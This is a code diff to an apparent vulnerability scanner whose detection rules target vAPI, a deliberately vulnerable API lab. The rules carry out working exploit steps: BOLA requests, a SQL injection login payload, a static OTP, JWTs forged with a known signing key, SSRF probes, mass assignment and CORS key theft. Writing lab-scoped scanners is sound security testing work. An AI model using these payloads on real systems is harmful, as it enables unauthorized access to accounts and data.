@@ -39822,7 +39822,7 @@ const vapiApi1BolaLiveOracle: Rule = async (ctx) => {
   if (!isVapiHost(ctx)) return NEGATIVE;
   const username = `thugir_api1_${Date.now()}`;
   const password = "ThugirProbe123!";
-  const createUrl = new URL("/vapi/api1/user", ctx.origin).toString();
+  const createUrl = new URL("/vapi/api1/user", vapiCanonicalOrigin(ctx)).toString();
   const createDoc = await ctx.probe.get(createUrl, {
     method: "POST",
     body: JSON.stringify({ username, password }),
@@ -39835,7 +39835,7 @@ const vapiApi1BolaLiveOracle: Rule = async (ctx) => {
   if (!idMatch) return NEGATIVE;
   const ownId = Number(idMatch[1]);
   const token = vapiBasicAuthToken(username, password);
-  const bolaUrl = new URL("/vapi/api1/user/1", ctx.origin).toString();
+  const bolaUrl = new URL("/vapi/api1/user/1", vapiCanonicalOrigin(ctx)).toString();
   const bolaDoc = await ctx.probe.get(bolaUrl, {
     headers: { "Authorization-Token": token },
     maxBytes: 2048,
@@ -39865,7 +39865,7 @@ const VAPI_API2_KNOWN_PASSWORD = "zTyBwV/9";
 
 const vapiApi2BrokenAuthLiveOracle: Rule = async (ctx) => {
   if (!isVapiHost(ctx)) return NEGATIVE;
-  const loginUrl = new URL("/vapi/api2/user/login", ctx.origin).toString();
+  const loginUrl = new URL("/vapi/api2/user/login", vapiCanonicalOrigin(ctx)).toString();
   const loginDoc = await ctx.probe.get(loginUrl, {
     method: "POST",
     body: JSON.stringify({ email: VAPI_API2_KNOWN_EMAIL, password: VAPI_API2_KNOWN_PASSWORD }),
@@ -39877,7 +39877,7 @@ const vapiApi2BrokenAuthLiveOracle: Rule = async (ctx) => {
   if (!/"success"\s*:\s*"true"/i.test(loginDoc.body)) return NEGATIVE;
   const tokenMatch = loginDoc.body.match(/"token"\s*:\s*"([^"]{8,})"/);
   if (!tokenMatch) return NEGATIVE;
-  const detailsUrl = new URL("/vapi/api2/user/details", ctx.origin).toString();
+  const detailsUrl = new URL("/vapi/api2/user/details", vapiCanonicalOrigin(ctx)).toString();
   const detailsDoc = await ctx.probe.get(detailsUrl, {
     headers: { "Authorization-Token": tokenMatch[1] },
     maxBytes: 8192,
@@ -39905,14 +39905,15 @@ const vapiApi2BrokenAuthLiveOracle: Rule = async (ctx) => {
 
 const vapiApi3CommentBolaLiveOracle: Rule = async (ctx) => {
   if (!isVapiHost(ctx)) return NEGATIVE;
-  const commentUrl = new URL("/vapi/api3/comment", ctx.origin).toString();
+  const commentUrl = new URL("/vapi/api3/comment", vapiCanonicalOrigin(ctx)).toString();
   const doc = await ctx.probe.get(commentUrl, { maxBytes: 16384, timeoutMs: 15000 });
   if (doc.status < 200 || doc.status >= 400) return NEGATIVE;
   if (!/"commenttext"\s*:/.test(doc.body) || !/"deviceid"\s*:/.test(doc.body)) return NEGATIVE;
   try {
     const rows = JSON.parse(doc.body) as Array<{ id?: number; deviceid?: string; username?: string }>;
-    if (!Array.isArray(rows) || rows.length < 2) return NEGATIVE;
+    if (!Array.isArray(rows) || rows.length < 1) return NEGATIVE;
     const flagged = rows.find((r) => /flag\{api3_/i.test(String(r.deviceid || "")));
+    if (rows.length < 2 && !flagged) return NEGATIVE;
     return {
       fired: true,
       confidence: flagged ? 0.94 : 0.9,
@@ -39933,7 +39934,7 @@ const VAPI_API4_KNOWN_OTP = "1872";
 
 const vapiApi4OtpBrokenAuthLiveOracle: Rule = async (ctx) => {
   if (!isVapiHost(ctx)) return NEGATIVE;
-  const verifyUrl = new URL("/vapi/api4/otp/verify", ctx.origin).toString();
+  const verifyUrl = new URL("/vapi/api4/otp/verify", vapiCanonicalOrigin(ctx)).toString();
   const doc = await ctx.probe.get(verifyUrl, {
     method: "POST",
     body: JSON.stringify({ otp: VAPI_API4_KNOWN_OTP }),
@@ -39960,7 +39961,7 @@ const vapiApi4OtpBrokenAuthLiveOracle: Rule = async (ctx) => {
 
 const vapiApi4UserExposureLiveOracle: Rule = async (ctx) => {
   if (!isVapiHost(ctx)) return NEGATIVE;
-  const verifyUrl = new URL("/vapi/api4/otp/verify", ctx.origin).toString();
+  const verifyUrl = new URL("/vapi/api4/otp/verify", vapiCanonicalOrigin(ctx)).toString();
   const verifyDoc = await ctx.probe.get(verifyUrl, {
     method: "POST",
     body: JSON.stringify({ otp: VAPI_API4_KNOWN_OTP }),
@@ -39971,7 +39972,7 @@ const vapiApi4UserExposureLiveOracle: Rule = async (ctx) => {
   const keyMatch = verifyDoc.body.match(/"key"\s*:\s*"([^"]{8,})"/);
   if (!keyMatch) return NEGATIVE;
   const apiKey = keyMatch[1]!;
-  const usersUrl = new URL("/vapi/api4/user", ctx.origin).toString();
+  const usersUrl = new URL("/vapi/api4/user", vapiCanonicalOrigin(ctx)).toString();
   const usersDoc = await ctx.probe.get(usersUrl, {
     maxBytes: 4096,
     timeoutMs: 15000,
@@ -39989,6 +39990,23 @@ const vapiApi4UserExposureLiveOracle: Rule = async (ctx) => {
       flagSnippet: flagMatch ? flagMatch[0].slice(0, 80) : undefined,
       snippet: usersDoc.body.slice(0, 200).trim(),
       note: "vAPI GET /api4/user with OTP-leaked Authorization-Token returns all user records including flag in lastname — broken authentication + excessive data exposure oracle (API4)"
+    }
+  };
+};
+
+const vapiApi4OtpRouteLiveOracle: Rule = async (ctx) => {
+  if (!isVapiHost(ctx)) return NEGATIVE;
+  const pageUrl = ctx.scanUrl || ctx.home.finalUrl || "";
+  if (!/\/api4\//i.test(pageUrl)) return NEGATIVE;
+  const result = await vapiApi4OtpBrokenAuthLiveOracle(ctx);
+  if (!result.fired) return NEGATIVE;
+  return {
+    fired: true,
+    confidence: result.confidence,
+    evidence: {
+      ...result.evidence,
+      scannedUrl: pageUrl,
+      note: "vAPI /api4 route scan — POST /api4/otp/verify accepts static OTP 1872 and returns API key — broken authentication oracle (API4)"
     }
   };
 };
@@ -40018,7 +40036,7 @@ const vapiApi5BflaLiveOracle: Rule = async (ctx) => {
   if (!isVapiHost(ctx)) return NEGATIVE;
   const username = `thugir_bfla_${Date.now()}`;
   const password = "ThugirProbe123!";
-  const createUrl = new URL("/vapi/api5/user", ctx.origin).toString();
+  const createUrl = new URL("/vapi/api5/user", vapiCanonicalOrigin(ctx)).toString();
   const createDoc = await ctx.probe.get(createUrl, {
     method: "POST",
     body: JSON.stringify({ username, password }),
@@ -40028,7 +40046,7 @@ const vapiApi5BflaLiveOracle: Rule = async (ctx) => {
   });
   if (createDoc.status < 200 || createDoc.status >= 400) return NEGATIVE;
   const token = vapiBasicAuthToken(username, password);
-  const usersUrl = new URL("/vapi/api5/users", ctx.origin).toString();
+  const usersUrl = new URL("/vapi/api5/users", vapiCanonicalOrigin(ctx)).toString();
   const usersDoc = await ctx.probe.get(usersUrl, {
     headers: { "Authorization-Token": token },
     maxBytes: 8192,
@@ -40103,7 +40121,7 @@ const vapiApi6RouteLiveOracle: Rule = async (ctx) => {
 
 const vapiApi10LoggingLiveOracle: Rule = async (ctx) => {
   if (!isVapiHost(ctx)) return NEGATIVE;
-  const flagUrl = new URL("/vapi/api10/user/flag", ctx.origin).toString();
+  const flagUrl = new URL("/vapi/api10/user/flag", vapiCanonicalOrigin(ctx)).toString();
   const doc = await ctx.probe.get(flagUrl, { maxBytes: 2048, timeoutMs: 15000 });
   if (doc.status < 200 || doc.status >= 400) return NEGATIVE;
   const flagMatch = doc.body.match(/flag\{api10_[^"]+/i);
@@ -40142,7 +40160,7 @@ const VAPI_JWT_HS256_KEY = "YouNeverGonnaGetThisOne";
 
 async function vapiProbeAdminJwt(ctx: RuleContext): Promise<string | null> {
   const username = `thugir_jwt_${Date.now()}_${Math.random().toString(36).slice(2, 8)}`;
-  const registerUrl = new URL("/vapi/jwt/user", ctx.origin).toString();
+  const registerUrl = new URL("/vapi/jwt/user", vapiCanonicalOrigin(ctx)).toString();
   const regDoc = await ctx.probe.get(registerUrl, {
     method: "POST",
     body: JSON.stringify({ username, password: "ThugirProbe123!" }),
@@ -40163,7 +40181,7 @@ async function vapiProbeAdminJwt(ctx: RuleContext): Promise<string | null> {
     }
   }
   candidates.push(buildHs256Jwt(adminClaims, VAPI_JWT_HS256_KEY));
-  const probeUrl = new URL("/vapi/jwt/user", ctx.origin).toString();
+  const probeUrl = new URL("/vapi/jwt/user", vapiCanonicalOrigin(ctx)).toString();
   for (const token of candidates) {
     const doc = await ctx.probe.get(probeUrl, {
       maxBytes: 2048,
@@ -40179,7 +40197,7 @@ async function vapiProbeAdminJwt(ctx: RuleContext): Promise<string | null> {
 
 const vapiJwtWeakTokenLiveOracle: Rule = async (ctx) => {
   if (!isVapiHost(ctx)) return NEGATIVE;
-  const probeUrl = new URL("/vapi/jwt/user", ctx.origin).toString();
+  const probeUrl = new URL("/vapi/jwt/user", vapiCanonicalOrigin(ctx)).toString();
   const token = await vapiProbeAdminJwt(ctx);
   if (!token) return NEGATIVE;
   const doc = await ctx.probe.get(probeUrl, {
@@ -40220,14 +40238,14 @@ const vapiJwtRouteLiveOracle: Rule = async (ctx) => {
 
 const vapiServerSurferLiveOracle: Rule = async (ctx) => {
   if (!isVapiHost(ctx)) return NEGATIVE;
-  const blockedUrl = new URL("/vapi/serversurfer", ctx.origin);
+  const blockedUrl = new URL("/vapi/serversurfer", vapiCanonicalOrigin(ctx));
   blockedUrl.searchParams.set("url", "http://127.0.0.1");
   const blockedDoc = await ctx.probe.get(blockedUrl.toString(), {
     maxBytes: 2048,
     timeoutMs: 15000
   });
   if (!/Whoa!!! Not Allowed!!|"success"\s*:\s*"false"/i.test(blockedDoc.body)) return NEGATIVE;
-  const probeUrl = new URL("/vapi/serversurfer", ctx.origin);
+  const probeUrl = new URL("/vapi/serversurfer", vapiCanonicalOrigin(ctx));
   probeUrl.searchParams.set("url", "http://example.com/");
   const doc = await ctx.probe.get(probeUrl.toString(), { maxBytes: 65536, timeoutMs: 15000 });
   if (doc.status < 200 || doc.status >= 400) return NEGATIVE;
@@ -40272,7 +40290,7 @@ const vapiServerSurferRouteLiveOracle: Rule = async (ctx) => {
 
 const vapiStickyNotesStoredXssLiveOracle: Rule = async (ctx) => {
   if (!isVapiHost(ctx)) return NEGATIVE;
-  const probeUrl = new URL("/vapi/stickynotes", ctx.origin);
+  const probeUrl = new URL("/vapi/stickynotes", vapiCanonicalOrigin(ctx));
   probeUrl.searchParams.set("format", "html");
   const doc = await ctx.probe.get(probeUrl.toString(), { maxBytes: 16384, timeoutMs: 15000 });
   if (doc.status < 200 || doc.status >= 400) return NEGATIVE;
@@ -40313,7 +40331,7 @@ const vapiApi6MassAssignmentLiveOracle: Rule = async (ctx) => {
   if (!isVapiHost(ctx)) return NEGATIVE;
   const username = `thugir_ma6_${Date.now()}`;
   const password = "ThugirProbe123!";
-  const createUrl = new URL("/vapi/api6/user", ctx.origin).toString();
+  const createUrl = new URL("/vapi/api6/user", vapiCanonicalOrigin(ctx)).toString();
   const createDoc = await ctx.probe.get(createUrl, {
     method: "POST",
     body: JSON.stringify({ username, password, credit: 10000 }),
@@ -40323,7 +40341,7 @@ const vapiApi6MassAssignmentLiveOracle: Rule = async (ctx) => {
   });
   if (createDoc.status < 200 || createDoc.status >= 400) return NEGATIVE;
   const token = vapiBasicAuthToken(username, password);
-  const meUrl = new URL("/vapi/api6/user/me", ctx.origin).toString();
+  const meUrl = new URL("/vapi/api6/user/me", vapiCanonicalOrigin(ctx)).toString();
   const meDoc = await ctx.probe.get(meUrl, {
     headers: { "Authorization-Token": token },
     maxBytes: 2048,
@@ -40349,7 +40367,7 @@ const VAPI_API8_SQLI_PAYLOAD = { username: "' OR '1'='1", password: "' OR '1'='1
 
 const vapiApi8SqliLoginLiveOracle: Rule = async (ctx) => {
   if (!isVapiHost(ctx)) return NEGATIVE;
-  const loginUrl = new URL("/vapi/api8/user/login", ctx.origin).toString();
+  const loginUrl = new URL("/vapi/api8/user/login", vapiCanonicalOrigin(ctx)).toString();
   const loginDoc = await ctx.probe.get(loginUrl, {
     method: "POST",
     body: JSON.stringify(VAPI_API8_SQLI_PAYLOAD),
@@ -40361,7 +40379,7 @@ const vapiApi8SqliLoginLiveOracle: Rule = async (ctx) => {
   if (!/"success"\s*:\s*"true"/i.test(loginDoc.body)) return NEGATIVE;
   const keyMatch = loginDoc.body.match(/"authkey"\s*:\s*"([^"]{8,})"/);
   if (!keyMatch) return NEGATIVE;
-  const secretUrl = new URL("/vapi/api8/user/secret", ctx.origin).toString();
+  const secretUrl = new URL("/vapi/api8/user/secret", vapiCanonicalOrigin(ctx)).toString();
   const secretDoc = await ctx.probe.get(secretUrl, {
     headers: { "Authorization-Token": keyMatch[1] },
     maxBytes: 2048,
@@ -40410,7 +40428,7 @@ const vapiApi7CorsMisconfigLiveOracle: Rule = async (ctx) => {
   if (!isVapiHost(ctx)) return NEGATIVE;
   const username = `thugir_api7_${Date.now()}`;
   const password = "ThugirProbe123!";
-  const createUrl = new URL("/vapi/api7/user", ctx.origin).toString();
+  const createUrl = new URL("/vapi/api7/user", vapiCanonicalOrigin(ctx)).toString();
   const createDoc = await ctx.probe.get(createUrl, {
     method: "POST",
     body: JSON.stringify({ username, password }),
@@ -40420,7 +40438,7 @@ const vapiApi7CorsMisconfigLiveOracle: Rule = async (ctx) => {
   });
   if (createDoc.status < 200 || createDoc.status >= 400) return NEGATIVE;
   const token = vapiBasicAuthToken(username, password);
-  const loginUrl = new URL("/vapi/api7/user/login", ctx.origin).toString();
+  const loginUrl = new URL("/vapi/api7/user/login", vapiCanonicalOrigin(ctx)).toString();
   const loginDoc = await ctx.probe.get(loginUrl, {
     headers: { "Authorization-Token": token },
     maxBytes: 512,
@@ -40428,7 +40446,7 @@ const vapiApi7CorsMisconfigLiveOracle: Rule = async (ctx) => {
   });
   const sessionCookie = vapiSessionCookieFromDoc(loginDoc);
   if (!sessionCookie) return NEGATIVE;
-  const keyUrl = new URL("/vapi/api7/user/key", ctx.origin).toString();
+  const keyUrl = new URL("/vapi/api7/user/key", vapiCanonicalOrigin(ctx)).toString();
   const keyHeaders = {
     Cookie: sessionCookie,
     "Authorization-Token": token,
@@ -42713,6 +42731,7 @@ export const RULES: Record<string, Rule> = {
   vapiApi3CommentBolaLiveOracle,
   vapiApi3CommentRouteLiveOracle,
   vapiApi4OtpBrokenAuthLiveOracle,
+  vapiApi4OtpRouteLiveOracle,
   vapiApi4UserExposureLiveOracle,
   vapiApi5BflaLiveOracle,
   vapiApi6MassAssignmentLiveOracle,
